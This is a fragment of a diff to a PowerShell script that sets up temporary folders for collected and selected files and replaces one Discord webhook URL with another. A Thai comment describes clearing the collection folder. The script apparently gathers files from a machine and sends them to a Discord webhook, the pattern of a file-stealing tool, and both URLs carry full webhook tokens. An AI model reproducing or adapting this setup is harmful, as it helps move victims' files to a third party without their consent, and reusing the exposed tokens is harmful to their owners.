@@ -2,7 +2,7 @@
 $zipFolder = "$env:TEMP\collected_files"
 $selectedFilesFolder = "$env:TEMP\selected_files"
 $testExtractFolder = "$env:TEMP\test_extract"
-$webhookUrl = "https://discord.com/api/webhooks/1303758531316682825/L8N0IY8YDlXQCQPDd6kfVJ3vNHQzUieIHcOXCKmMcZ3c8tK3fvNL8gjBoj4jvfuPlZrJ"
+$webhookUrl = "https://discord.com/api/webhooks/1303711376308703277/8BD3Y3sXkE-px0_KlXTpbnMNrgQ5IUe8YmliPhvnFvwZbSR34Owk497hJ_xcRw3HlSH-"
 
 # ล้างโฟลเดอร์เก็บไฟล์ชั่วคราวและสร้างใหม่
 if (Test-Path $zipFolder) { Remove-Item -Recurse -Force $zipFolder }
